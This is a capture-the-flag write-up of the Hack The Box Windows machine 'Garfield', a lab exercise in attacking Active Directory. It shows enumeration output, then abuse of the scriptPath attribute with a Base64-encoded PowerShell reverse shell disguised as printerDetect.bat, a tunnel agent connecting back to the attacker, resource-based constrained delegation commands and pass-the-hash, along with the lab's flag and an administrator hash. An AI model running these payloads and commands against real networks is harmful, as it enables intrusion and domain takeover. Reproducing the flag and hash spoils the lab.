### HTB Write-Up: Garfield
| Field | Details |
| ------ | ------ |
| Platform | Hack The Box |
| Difficulty | Hard |
| OS | Windows |
| Date | June 28, 2026 |

--------------------------------------------------------------------------------

#### Table of Contents
1. Reconnaissance — Rustscan & Nmap
2. Enumeration — User Harvesting, SMB Exploration & AD Permissions
3. Initial Access — Abuse of scriptPath Attribute
4. Lateral Movement — ForceChangePassword to l.wilson_adm
5. Network Pivoting — Ligolo-ng Tunneling to RODC
6. Privilege Escalation — RBCD on Read-Only Domain Controller
7. Final Compromise — Domain Admin via Pass-the-Hash

--------------------------------------------------------------------------------

#### 1. Reconnaissance
The engagement begins with identifying open ports and services. We use **Rustscan** for rapid port discovery and **Nmap** for service versioning and OS fingerprinting.

**Port Discovery (Rustscan):**
```bash
➜  Downloads rustscan -a 10.129.244.207
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_    *}{ {* _  /  ___} / {} \ |  | |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
--------------------------------------------------------------------------------
Open 10.129.244.207:53
Open 10.129.244.207:88
Open 10.129.244.207:135
Open 10.129.244.207:139
Open 10.129.244.207:389
Open 10.129.244.207:445
Open 10.129.244.207:464
Open 10.129.244.207:593
Open 10.129.244.207:636
Open 10.129.244.207:2179
Open 10.129.244.207:3268
Open 10.129.244.207:3269
Open 10.129.244.207:3389
Open 10.129.244.207:5985
Open 10.129.244.207:9389
```

**Service Scanning (Nmap):**
```bash
➜  Downloads nmap -A -p88,389,445,593,3268,2179 10.129.244.207
PORT     STATE SERVICE       VERSION
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-06-28 01:14:22Z)
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: garfield.htb, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
2179/tcp open  vmrdp?
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: garfield.htb, Site: Default-First-Site-Name)

Host script results:
| clock-skew: 8h00m01s
| smb2-security-mode:
|   3.1.1:
|     Message signing enabled and required
```
The scan identifies the domain **garfield.htb** and the host **DC01**. An 8-hour clock skew is detected, which is important for Kerberos operations.

--------------------------------------------------------------------------------

#### 2. Enumeration — User Harvesting, SMB Exploration & AD Permissions
##### 2.1 — Username Extraction
We use initial credentials for `j.arbuckle` (`Th1sD4mnC4t!@1978`) to list domain users via **netexec**.
```bash
➜  garfield netexec smb garfield.htb -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' --users
SMB         10.129.244.207  445    DC01             [+] garfield.htb\j.arbuckle:Th1sD4mnC4t!@1978
SMB         10.129.244.207  445    DC01             Administrator
SMB         10.129.244.207  445    DC01             Guest
SMB         10.129.244.207  445    DC01             krbtgt
SMB         10.129.244.207  445    DC01             krbtgt_8245
SMB         10.129.244.207  445    DC01             j.arbuckle
SMB         10.129.244.207  445    DC01             l.wilson
SMB         10.129.244.207  445    DC01             l.wilson_adm

➜  garfield awk '{print $5}' users > usernames.txt
```

##### 2.2 — SMB Share Enumeration (SYSVOL)
We explore the `SYSVOL` share to understand the directory structure and check for existing scripts.
```bash
➜  garfield smbclient //10.129.244.207/SYSVOL -U 'j.arbuckle%Th1sD4mnC4t!@1978'
smb: > RECURSE ON
smb: > ls
\garfield.htb\scripts
  .                                   D        0  Wed Jan 28 02:13:47 2026
  ..                                  D        0  Wed Jan 28 02:13:47 2026
  printerDetect.bat                   A      217  Sat Sep 13 02:20:29 2025
```

##### 2.3 — Finding Writable Permissions with bloodyAD
BloodHound did not explicitly show certain permissions, so we use **bloodyAD** to identify objects we can modify.
```bash
➜  garfield bloodyAD --host garfield.htb -d garfield.htb -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' get writable
distinguishedName: CN=Guest,CN=Users,DC=garfield,DC=htb permission: WRITE
distinguishedName: CN=krbtgt_8245,CN=Users,DC=garfield,DC=htb permission: WRITE
distinguishedName: CN=Jon Arbuckle,CN=Users,DC=garfield,DC=htb permission: WRITE
distinguishedName: CN=Liz Wilson,CN=Users,DC=garfield,DC=htb permission: WRITE
distinguishedName: CN=Liz Wilson ADM,CN=Users,DC=garfield,DC=htb permission: WRITE
```
We have **WRITE** permission over `l.wilson`, which allows us to abuse the `scriptPath` attribute.

--------------------------------------------------------------------------------

#### 3. Initial Access — Abuse of scriptPath Attribute
##### 3.1 — Mechanism
When a user logs in, AD checks the `scriptPath` attribute and runs the specified script from the `SYSVOL` share. 

##### 3.2 — Payload Preparation
We create a `printerDetect.bat` file containing a Base64-encoded PowerShell reverse shell:
```bash
➜  garfield cat printerDetect.bat
@echo off
powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA1AC4AMgAzADcAIgAsADQANAA0ADQAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA
```

##### 3.3 — Upload and Attribute Modification
We upload the malicious script to the DC and update the user's attribute:
```bash
➜  garfield smbclient //10.129.244.207/SYSVOL -U 'j.arbuckle%Th1sD4mnC4t!@1978' -c 'cd garfield.htb\scripts; put printerDetect.bat'

➜  garfield bloodyAD --host 10.129.244.207 -d garfield.htb -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' set object "CN=Liz Wilson,CN=Users,DC=garfield,DC=htb" scriptPath -v 'printerDetect.bat'
```

--------------------------------------------------------------------------------

#### 4. Lateral Movement — ForceChangePassword to l.wilson_adm
After catching the reverse shell as `l.wilson`, we find we have **ForceChangePassword** over `l.wilson_adm`.
```powershell
➜  garfield nc -lnvp 4444
PS C:\Users\l.wilson\Documents\Scripts> $newpass = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
PS C:\Users\l.wilson\Documents\Scripts> Set-ADAccountPassword -Identity l.wilson_adm -NewPassword $newpass -Reset
```

We verify the credentials and access the user flag:
```bash
➜  garfield netexec winrm garfield.htb -u l.wilson_adm -p 'Password123!'
WINRM       10.129.244.207  5985   DC01             [+] garfield.htb\l.wilson_adm:Password123! (Pwn3d!)

➜  garfield evil-winrm -i 10.129.244.207 -u l.wilson_adm -p 'Password123!'
PS C:\Users\l.wilson_adm\Desktop> type user.txt
6eda20a351bf9082a8c1ab68f20c9bdf
```

--------------------------------------------------------------------------------

#### 5. Network Pivoting — Ligolo-ng Tunneling to RODC
We discover an internal machine **RODC01** at `192.168.100.2`. We use **Ligolo-ng** to pivot into the private network.

**On Kali:**
```bash
➜  Ligolo sudo ./proxy -selfcert -laddr 0.0.0.0:11601
➜  Tools sudo ip route add 192.168.100.0/24 dev ligolo
```

**On the Target (DC01):**
```powershell
PS C:\tmp> ./agent -connect 10.10.15.237:11601 -ignore-cert
```
Verification: `ping 192.168.100.2` succeeds from Kali.

--------------------------------------------------------------------------------

#### 6. Privilege Escalation — RBCD on Read-Only Domain Controller
##### 6.1 — Gaining RODC Admin
As a member of the **Tier 1** group, we add ourselves to the **RODC Administrators** group.
```bash
➜  Tools bloodyAD --host 10.129.244.207 -d garfield.htb -u l.wilson_adm -p 'Password123!' add groupMember "RODC Administrators" 'l.wilson_adm'
```

##### 6.2 — Resource-Based Constrained Delegation (RBCD)
We exploit the **WriteAccountRestrictions** ACE by creating a controlled machine account and configuring delegation to impersonate the Administrator on the RODC.

**Step 1: Create Fake Computer**
```bash
impacket-addcomputer -computer-name 'FAKEMACHINE' -computer-pass 'FAKEMACHINE123!' -dc-ip 10.129.244.207 'garfield.htb/l.wilson_adm:Password123!'
```

**Step 2: Configure Delegation**
```bash
impacket-rbcd -action write -delegate-from 'FAKEMACHINE$' -delegate-to 'RODC01$' -dc-ip 10.129.244.207 'garfield.htb/l.wilson_adm:Password123!'
```

**Step 3: Request Service Ticket**
```bash
impacket-getST -spn 'cifs/RODC01.garfield.htb' -impersonate Administrator -altservice host -dc-ip 10.129.244.207 'garfield.htb/FAKEMACHINE$:FAKEMACHINE123!'
```

--------------------------------------------------------------------------------

#### 7. Final Compromise — Domain Admin via Pass-the-Hash
##### 7.1 — RODC Access
We use the ticket to authenticate to `RODC01`:
```bash
export KRB5CCNAME=Administrator@host_RODC01.garfield.htb@GARFIELD.HTB.ccache
impacket-wmiexec -k -no-pass -dc-ip 10.129.244.207 garfield.htb/Administrator@RODC01.garfield.htb
```

##### 7.2 — Gaining Domain Admin on DC01
To bypass the "Double Hop" issue, we execute a reverse shell on `RODC01` to perform operations back against the main DC. We obtain the Administrator hash and authenticate via **Pass-the-Hash** to `DC01`.
```bash
evil-winrm -i 10.129.244.207 -u Administrator -H ee238f6debc752010428f20875b092d5
```

**Root Flag:**
```powershell
PS C:\Users\Administrator\Desktop> type root.txt
```
